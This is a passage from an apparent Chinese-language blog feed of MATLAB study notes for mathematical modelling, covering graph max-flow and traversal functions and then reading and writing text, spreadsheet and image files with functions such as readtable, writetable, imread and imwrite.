class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[MaxFlow,FlowMatrix,Cut]=graphmaxflow(G,SNode,TNode)<br>[...]=graphmaxflow(G,SNode,TNode,...’Capacity’,CapacityValue,...)<br>[...]=graphmaxflow(G,SNode,TNode,...’Method’,MethodValue,...)<br></code></pre></div></td></tr></table></figure><ul><li>参数：输入参数G（N * N的稀疏矩阵）；输入参数SNode（起点）；输入参数TNcode（目标点）；CapacityValue属性（每条边自定义容量的列向量，默认从G中获取）；MethodValue属性（可以取‘Edmonds’和‘Goldberg’算法）；输出参数MaxFlow（网络最大流）；输出参数FlowMatrix（每条边数据流的值所组成的稀疏矩阵）；输出参数cut（连接起点与目标点的逻辑向量，如果有多个解时，Cut是一个矩阵）。</li></ul><h2 id="4-图的遍历"><a href="#4-图的遍历" class="headerlink" title="4.图的遍历"></a>4.图的遍历</h2><blockquote><ol><li>功能</li></ol></blockquote><p>从某一个顶点出发，遍历图中所有的顶点。可以用来判断一个图是否连通。</p><blockquote><ol start="2"><li>使用格式</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[disc,pred,closed]=graphtraverse(G,S)<br>[...]=graphtraverse(G,S,...’Directed’,DirectedValue,...)<br>[...]=graphtraverse(G,S,...’Depth’,DepthValue,...)<br>[...]=graphtraverse(G,S,...’Method’,MethodValue,...)<br></code></pre></div></td></tr></table></figure><ul><li>参数：G（有向图的稀疏矩阵）；S（起始节点）；Disc（节点索引向量）；Pred（祖先节点索引向量）。</li></ul><p>Methodvalue表示遍历方法：默认为“深度优先遍历”。可选BFS、DFS。<br>Depthvalue表示遍历深度值：表示图G中指定搜索深度的节点的整数。默认值是Inf(无穷大)。</p><h1 id="待更新函数"><a href="#待更新函数" class="headerlink" title="待更新函数"></a>待更新函数</h1><table><thead><tr><th align="center">函数名</th><th align="center">功能描述</th></tr></thead><tbody><tr><td align="center"><code>graphconncomp</code></td><td align="center">找无向图的连通分支，或有向图的强弱连通分支</td></tr><tr><td align="center"><code>graphisdag</code></td><td align="center">测试有向图是否含有圈，不含圈返回1，否则返回0</td></tr><tr><td align="center"><code>graphisomorphism</code></td><td align="center">确定两个图是否同构，同构返回1，否则返回0</td></tr><tr><td align="center"><code>graphisspantree</code></td><td align="center">确定一个图是否是生成树，是返回1，否则返回0</td></tr><tr><td align="center"><code>graphpred2path</code></td><td align="center">把前驱顶点序列变成路径的顶点序列</td></tr><tr><td align="center"><code>graphtopootder</code></td><td align="center">执行有向无圈图的拓扑排序</td></tr><tr><td align="center"><code>graphtraverse</code></td><td align="center">求从一顶点出发，所能遍历图中的顶点</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（十六）数据导入导出</title>
    <link href="/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%8D%81%E5%85%AD%EF%BC%89%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"/>
    <url>/2021/06/18/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%8D%81%E5%85%AD%EF%BC%89%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="显示文本中的数据"><a href="#显示文本中的数据" class="headerlink" title="显示文本中的数据"></a>显示文本中的数据</h2><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">type</span> test.txt <span class="hljs-comment">% 显示test文本中的数据，但必须需要已经在文本所在的目录下。</span><br></code></pre></div></td></tr></table></figure><h2 id="一-文本"><a href="#一-文本" class="headerlink" title="一.文本"></a>一.文本</h2><h2 id="1-导入数据"><a href="#1-导入数据" class="headerlink" title="1.导入数据"></a>1.导入数据</h2><p>文本文件包括：CSV、TXT文件。</p><h3 id="1-1从文本文件中读入表中（readtable函数）"><a href="#1-1从文本文件中读入表中（readtable函数）" class="headerlink" title="1.1从文本文件中读入表中（readtable函数）"></a>1.1从文本文件中读入表中（readtable函数）</h3><blockquote><ol><li>使用方法</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">t=<span class="hljs-built_in">readtable</span>(<span class="hljs-string">&#x27;文件名字+后缀名&#x27;</span>) <span class="hljs-comment">% 文件名的使用只适用 已在文件所在的目录下。</span><br>t(<span class="hljs-number">1</span>:<span class="hljs-number">3</span>,<span class="hljs-number">1</span>:<span class="hljs-number">3</span>) <span class="hljs-comment">% 显示特定行和列。显示前3行和前3列。</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-从文本文件中读取矩阵（readmatrix函数）"><a href="#1-2-从文本文件中读取矩阵（readmatrix函数）" class="headerlink" title="1.2 从文本文件中读取矩阵（readmatrix函数）"></a>1.2 从文本文件中读取矩阵（readmatrix函数）</h3><blockquote><ol><li>使用方法</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">t=readmatrix(<span class="hljs-string">&#x27;文件名字+后缀名&#x27;</span>) <span class="hljs-comment">% 文件名的使用只适用 已在文件所在的目录下。</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-从指定工作表和范围中读取矩阵（readmatrix函数）"><a href="#1-3-从指定工作表和范围中读取矩阵（readmatrix函数）" class="headerlink" title="1.3 从指定工作表和范围中读取矩阵（readmatrix函数）"></a>1.3 从指定工作表和范围中读取矩阵（readmatrix函数）</h3><p>在一个表格文件中含有多个表格时，可以使用。</p><blockquote><ol><li>使用方法</li></ol></blockquote><ul><li>方法一：</li></ul><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">opts = detectImportOptions(<span class="hljs-string">&#x27;表文件名+后缀名&#x27;</span>);<br><span class="hljs-comment">% 必须先运行上述代码，否则会出错。</span><br><span class="hljs-comment">% 上述代码有时也可以简写为 opts=(&#x27;表文件名+后缀名&#x27;)</span><br>preview(<span class="hljs-string">&#x27;表文件名+后缀名&#x27;</span>,opts) <span class="hljs-comment">%用来输出表的数据，默认是输出第一个表的前8行数据</span><br><br>opts.Sheet=<span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-comment">% 需要操作的表名</span><br>opts.SelectedVariableNames=[<span class="hljs-built_in">i</span>:<span class="hljs-built_in">j</span>] <span class="hljs-comment">% 操作第 i 列到第 j 列（即哪些变量的值）。这里的i 和 j是相对于第几个数据，所以前面有空列不影响</span><br>opts.DataRange=<span class="hljs-string">&#x27;i:j&#x27;</span>; <span class="hljs-comment">% 操作第 i 行到第 j 行（即输出哪些数据）。这里的i 和 j是相对于第几行的数据，所以前面有空行时是会有影响的，会输出 NAN。</span><br>m=readmatrix(<span class="hljs-string">&#x27;表文件名+后缀名&#x27;</span>,opts)<br></code></pre></div></td></tr></table></figure><ul><li>方法二：</li></ul><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">opts = detectImportOptions(<span class="hljs-string">&#x27;表文件名+后缀名&#x27;</span>);<br><br>m=readmatrix(<span class="hljs-string">&#x27;表文件名+后缀名&#x27;</span>,<span class="hljs-string">&#x27;Sheet&#x27;</span>,<span class="hljs-string">&#x27;表名&#x27;</span>,<span class="hljs-string">&#x27;Range&#x27;</span>,<span class="hljs-string">&#x27;I:J&#x27;</span>) <span class="hljs-comment">% Rang：表示要读取的数据部分。I 和 J 表示需要的数据范围内的数据，即 I 和 J 是一个矩阵的左上角和右下角之内的所有数据，如：B2:E23（表示B2到E23之内的所有数据）。</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-从文件中读取元胞数组（readcell函数）"><a href="#1-4-从文件中读取元胞数组（readcell函数）" class="headerlink" title="1.4 从文件中读取元胞数组（readcell函数）"></a>1.4 从文件中读取元胞数组（readcell函数）</h3><blockquote><ol><li>从文本文件中读取元胞数组</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">c=readcell(<span class="hljs-string">&#x27;文件名+后缀名&#x27;</span>)<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>从表格中读取元胞数组</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 读取首表的所有数据</span><br>c=readcell(<span class="hljs-string">&#x27;文件名+后缀名&#x27;</span>)<br><br># 从指定的工作表和范围读取元胞数组<br>opt=detectImportOptions(<span class="hljs-string">&#x27;表文件名+后缀名&#x27;</span>);<br>m=readcell(<span class="hljs-string">&#x27;表文件名+后缀名&#x27;</span>,<span class="hljs-string">&#x27;Sheet&#x27;</span>,<span class="hljs-string">&#x27;表名&#x27;</span>,<span class="hljs-string">&#x27;Range&#x27;</span>,<span class="hljs-string">&#x27;I:J&#x27;</span>) <span class="hljs-comment">% Rang：表示要读取的数据部分。I 和 J 表示需要的数据范围内的数据，即 I 和 J 是一个矩阵的左上角和右下角之内的所有数据，如：B2:E23（表示B2到E23之内的所有数据）。同readmatrix用法一样。</span><br></code></pre></div></td></tr></table></figure><h2 id="2-导出数据"><a href="#2-导出数据" class="headerlink" title="2.导出数据"></a>2.导出数据</h2><h3 id="2-1-写入文本文件"><a href="#2-1-写入文本文件" class="headerlink" title="2.1 写入文本文件"></a>2.1 写入文本文件</h3><blockquote><ol><li>将表导出到文本文件（writetable函数）</li></ol></blockquote><ul><li>用法一：</li></ul><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">Pitch = [<span class="hljs-number">0.7</span>;<span class="hljs-number">0.8</span>;<span class="hljs-number">1</span>;<span class="hljs-number">1.25</span>;<span class="hljs-number">1.5</span>];<br>Shape = &#123;<span class="hljs-string">&#x27;Pan&#x27;</span>;<span class="hljs-string">&#x27;Round&#x27;</span>;<span class="hljs-string">&#x27;Button&#x27;</span>;<span class="hljs-string">&#x27;Pan&#x27;</span>;<span class="hljs-string">&#x27;Round&#x27;</span>&#125;;<br>Price = [<span class="hljs-number">10.0</span>;<span class="hljs-number">13.59</span>;<span class="hljs-number">10.50</span>;<span class="hljs-number">12.00</span>;<span class="hljs-number">16.69</span>];<br>Stock = [<span class="hljs-number">376</span>;<span class="hljs-number">502</span>;<span class="hljs-number">465</span>;<span class="hljs-number">1091</span>;<span class="hljs-number">562</span>];<br>T = <span class="hljs-built_in">table</span>(Pitch,Shape,Price,Stock)<br><br><span class="hljs-built_in">writetable</span>(T,<span class="hljs-string">&#x27;tabledata.txt&#x27;</span>);<br><span class="hljs-comment">% 导出到当前目录下，名字为tabledata.txt到文本文件。默认情况，会以逗号分隔数据，将表变量名称作为列标题。</span><br></code></pre></div></td></tr></table></figure><ul><li>用法二：</li></ul><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 用用法一中的数据实现</span><br>rowNames = &#123;<span class="hljs-string">&#x27;M4&#x27;</span>;<span class="hljs-string">&#x27;M5&#x27;</span>;<span class="hljs-string">&#x27;M6&#x27;</span>;<span class="hljs-string">&#x27;M8&#x27;</span>;<span class="hljs-string">&#x27;M10&#x27;</span>&#125;;<br>T2 = <span class="hljs-built_in">table</span>(Pitch,Shape,Price,Stock,<span class="hljs-string">&#x27;RowNames&#x27;</span>,rowNames)<br><span class="hljs-comment">% RowNames参数 指定行名称。</span><br><br><span class="hljs-built_in">writetable</span>(T2,<span class="hljs-string">&#x27;tabledata2.txt&#x27;</span>,<span class="hljs-string">&#x27;Delimiter&#x27;</span>,<span class="hljs-string">&#x27;\t&#x27;</span>,<span class="hljs-string">&#x27;WriteRowNames&#x27;</span>,<span class="hljs-built_in">true</span>);<br><span class="hljs-comment">% Delimiter参数指定 制表符为分隔符；WriteRowNames参数 包括行名称。</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>将元胞数组导出到文本文件（writecell函数）</li></ol></blockquote><ul><li>方法一：</li></ul><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">C = &#123;<span class="hljs-string">&#x27;Atkins&#x27;</span>,<span class="hljs-number">32</span>,<span class="hljs-number">77.3</span>,<span class="hljs-string">&#x27;M&#x27;</span>;<span class="hljs-string">&#x27;Cheng&#x27;</span>,<span class="hljs-number">30</span>,<span class="hljs-number">99.8</span>,<span class="hljs-string">&#x27;F&#x27;</span>;<span class="hljs-string">&#x27;Lam&#x27;</span>,<span class="hljs-number">31</span>,<span class="hljs-number">80.2</span>,<span class="hljs-string">&#x27;M&#x27;</span>&#125;<br>writecell(C,<span class="hljs-string">&#x27;data.dat&#x27;</span>)<br></code></pre></div></td></tr></table></figure><ul><li>方法二：（fprintf函数）<br>将数据写入一个文本中。也可以从一个文本中写入另外一个文件中。<figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">C = &#123;<span class="hljs-string">&#x27;Atkins&#x27;</span>,<span class="hljs-number">32</span>,<span class="hljs-number">77.3</span>,<span class="hljs-string">&#x27;M&#x27;</span>;<span class="hljs-string">&#x27;Cheng&#x27;</span>,<span class="hljs-number">30</span>,<span class="hljs-number">99.8</span>,<span class="hljs-string">&#x27;F&#x27;</span>;<span class="hljs-string">&#x27;Lam&#x27;</span>,<span class="hljs-number">31</span>,<span class="hljs-number">80.2</span>,<span class="hljs-string">&#x27;M&#x27;</span>&#125;<br><br>fileID = fopen(<span class="hljs-string">&#x27;mydata.dat&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<br>formatSpec = <span class="hljs-string">&#x27;%s %d %2.1f %s\n&#x27;</span>; <span class="hljs-comment">% 使用空格分隔每个格式设定符，以指示对输出文件使用空格分隔符。在每行数据的末尾包括换行符 (&#x27;\n&#x27;)。</span><br><br><span class="hljs-comment">%确定 C 的大小，并使用 fprintf 函数一次导出一行数据。然后关闭文件。fprintf 将写入一个空格分隔的文件。</span><br>[nrows,ncols] = <span class="hljs-built_in">size</span>(C);<br><span class="hljs-keyword">for</span> row = <span class="hljs-number">1</span>:nrows<br>    fprintf(fileID,formatSpec,C&#123;row,:&#125;);<br><span class="hljs-keyword">end</span><br>fclose(fileID);<br><br></code></pre></div></td></tr></table></figure></li></ul><blockquote><ol start="3"><li>将数值数组导出到文本文件（writematrix函数）</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">A = <span class="hljs-built_in">magic</span>(<span class="hljs-number">5</span>)/<span class="hljs-number">10</span> <br>writematrix(A,<span class="hljs-string">&#x27;myData.dat&#x27;</span>,<span class="hljs-string">&#x27;Delimiter&#x27;</span>,<span class="hljs-string">&#x27;;&#x27;</span>)  <span class="hljs-comment">% 将分隔符指定为 &#x27;;&#x27;。</span><br></code></pre></div></td></tr></table></figure><h2 id="二-图像"><a href="#二-图像" class="headerlink" title="二.图像"></a>二.图像</h2><h3 id="2-1-读取（imread函数）"><a href="#2-1-读取（imread函数）" class="headerlink" title="2.1 读取（imread函数）"></a>2.1 读取（imread函数）</h3><blockquote><ol><li>读取和显示图像</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">A = imread(<span class="hljs-string">&#x27;图片名.jpg&#x27;</span>);<br>image(A)<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>将索引图像转换成RGB</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[X,cmap] = imread(<span class="hljs-string">&#x27;名字.tiff&#x27;</span>);<br><span class="hljs-comment">% 索引图像 X 是 uint8 类型的 415×312 数组。颜色图 cmap 是 double 类型的 256×3 矩阵，因此索引图像中有 256 种颜色。显示图像。</span><br>imshow(X,cmap)<br><br><span class="hljs-comment">% 将索引图像转换为 RGB 图像。结果为一个 double 类型的 415×312×3 数组。</span><br>RGB = ind2rgb(X,cmap);<br><span class="hljs-comment">% 检查 RGB 图像的值是否在 [0, 1] 范围内。</span><br><span class="hljs-built_in">disp</span>([<span class="hljs-string">&#x27;Range of RGB image is [&#x27;</span>,num2str(<span class="hljs-built_in">min</span>(RGB(:))),<span class="hljs-string">&#x27;, &#x27;</span>,num2str(<span class="hljs-built_in">max</span>(RGB(:))),<span class="hljs-string">&#x27;].&#x27;</span>])<br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>读取多页 TIFF 文件中的特定图像</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[X,map] = imread(<span class="hljs-string">&#x27;corn.tif&#x27;</span>,<span class="hljs-number">3</span>);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>返回 PNG 图像的 Alpha 通道</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">[X,map,alpha] = imread(<span class="hljs-string">&#x27;name.png&#x27;</span>);<br>whos alpha<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>读取 TIFF 图像的指定区域</li></ol></blockquote><p>用表示要读取的区域边界的向量元胞数组指定 ‘PixelRegion’ 参数。第一向量指定要读取的行范围，第二向量指定要读取的列范围。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">A = imread(<span class="hljs-string">&#x27;name.tif&#x27;</span>,<span class="hljs-string">&#x27;PixelRegion&#x27;</span>,&#123;[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>],[<span class="hljs-number">2</span>,<span class="hljs-number">5</span>]&#125;);<br><span class="hljs-comment">% imread 读取 name.tif 中 1–2 行和 2–5 列的图像数据，并返回 2×4 数组 A。</span><br></code></pre></div></td></tr></table></figure><h3 id="2-2-读出（imwrite函数）"><a href="#2-2-读出（imwrite函数）" class="headerlink" title="2.2 读出（imwrite函数）"></a>2.2 读出（imwrite函数）</h3><blockquote><ol><li>将灰度图像写入 PNG</li></ol></blockquote><p>将一个 50×50 的灰度值数组写入当前文件夹中的 PNG 文件。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">A = <span class="hljs-built_in">rand</span>(<span class="hljs-number">50</span>);<br>imwrite(A,<span class="hljs-string">&#x27;myGray.png&#x27;</span>)<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>将索引图像数据写入 PNG</li></ol></blockquote><p>将索引图像数组和其关联的颜色图写入 PNG 文件。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">load clown.mat<br>imwrite(X,map,<span class="hljs-string">&#x27;myclown.png&#x27;</span>) <span class="hljs-comment">% 图像数组 X 和其关联颜色图 map 均加载至 MATLAB工作区。</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>用 MATLAB 颜色图写入索引图像</li></ol></blockquote><p>用 MATLAB 内置的颜色图 copper 将图像数据写入新的 PNG 文件。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">load clown.mat<br>newmap = copper(<span class="hljs-number">81</span>); <span class="hljs-comment">%用 81 RGB 向量定义铜色调颜色图。</span><br>imwrite(X,newmap,<span class="hljs-string">&#x27;copperclown.png&#x27;</span>); <span class="hljs-comment">% 在当前文件夹中创建文件 copperclown.png。</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>将真彩色图像写入 JPEG</li></ol></blockquote><p>创建真彩色图像数据并将其写入 JPEG 文件。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 创建一个随机 RGB 值的 49×49×3 数组。</span><br>A = <span class="hljs-built_in">rand</span>(<span class="hljs-number">49</span>,<span class="hljs-number">49</span>);<br>A(:,:,<span class="hljs-number">2</span>) = <span class="hljs-built_in">rand</span>(<span class="hljs-number">49</span>,<span class="hljs-number">49</span>);<br>A(:,:,<span class="hljs-number">3</span>) = <span class="hljs-built_in">rand</span>(<span class="hljs-number">49</span>,<span class="hljs-number">49</span>);<br><br><span class="hljs-comment">% 将图像数据写入 JPEG 文件，并用 &#x27;jpg&#x27; 指定输出格式。使用 &#x27;Comment&#x27; 参数添加文件注释。</span><br>imwrite(A,<span class="hljs-string">&#x27;newImage.jpg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;Comment&#x27;</span>,<span class="hljs-string">&#x27;My JPEG file&#x27;</span>)<br><br><span class="hljs-comment">% 查看有关新文件的信息</span><br>imfinfo(<span class="hljs-string">&#x27;newImage.jpg&#x27;</span>)<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>将多个图像写入 TIFF 文件</li></ol></blockquote><p>将多个图像写入一个多页 TIFF 文件。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 创建两个随机图像数据集 im1 和 im2。</span><br>im1 = <span class="hljs-built_in">rand</span>(<span class="hljs-number">50</span>,<span class="hljs-number">40</span>,<span class="hljs-number">3</span>);<br>im2 = <span class="hljs-built_in">rand</span>(<span class="hljs-number">50</span>,<span class="hljs-number">50</span>,<span class="hljs-number">3</span>);<br><br><span class="hljs-comment">% 将第一个图像写入新的 TIFF 文件。然后将第二个图像添加至同一文件。</span><br>imwrite(im1,<span class="hljs-string">&#x27;myMultipageFile.tif&#x27;</span>)<br>imwrite(im2,<span class="hljs-string">&#x27;myMultipageFile.tif&#x27;</span>,<span class="hljs-string">&#x27;WriteMode&#x27;</span>,<span class="hljs-string">&#x27;append&#x27;</span>)<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>写入 GIF 动画</li></ol></blockquote><p>绘制一系列图、将它们捕获为图像，然后写入 GIF 动画文件。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-comment">% 绘制y=y^x，其中n=3</span><br>x = <span class="hljs-number">0</span>:<span class="hljs-number">0.01</span>:<span class="hljs-number">1</span>;<br>n = <span class="hljs-number">3</span>;<br>y = x.^n;<br><span class="hljs-built_in">plot</span>(x,y,<span class="hljs-string">&#x27;LineWidth&#x27;</span>,<span class="hljs-number">3</span>)<br>title([<span class="hljs-string">&#x27;y = x^n,  n = &#x27;</span> num2str(n) ])<br><br><span class="hljs-comment">% 捕获 $n$ 值递增时的一系列绘图。</span><br>n = <span class="hljs-number">1</span>:<span class="hljs-number">0.5</span>:<span class="hljs-number">5</span>;<br>nImages = <span class="hljs-built_in">length</span>(n);<br><br>fig = <span class="hljs-built_in">figure</span>;<br><span class="hljs-keyword">for</span> idx = <span class="hljs-number">1</span>:nImages<br>    y = x.^n(idx);<br>    <span class="hljs-built_in">plot</span>(x,y,<span class="hljs-string">&#x27;LineWidth&#x27;</span>,<span class="hljs-number">3</span>)<br>    title([<span class="hljs-string">&#x27;y = x^n,  n = &#x27;</span> num2str( n(idx)) ])<br>    drawnow<br>    frame = getframe(fig);<br>    im&#123;idx&#125; = frame2im(frame);<br><span class="hljs-keyword">end</span><br>close;<br><br><span class="hljs-comment">% 将多个系列的图像显示在一个图窗中。</span><br><span class="hljs-built_in">figure</span>;<br><span class="hljs-keyword">for</span> idx = <span class="hljs-number">1</span>:nImages<br>    subplot(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,idx)<br>    imshow(im&#123;idx&#125;);<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">% 将九个图像保存到一个 GIF 文件中。因为 GIF 文件不支持三维数据，所以应调用 rgb2ind，使用颜色图 map 将图像中的 RGB 数据转换为索引图像 A。要将多个图像添加到第一个图像中，使用参数 &#x27;WriteMode&#x27;,&#x27;append&#x27; 调用 imwrite。</span><br>filename = <span class="hljs-string">&#x27;testAnimated.gif&#x27;</span>; 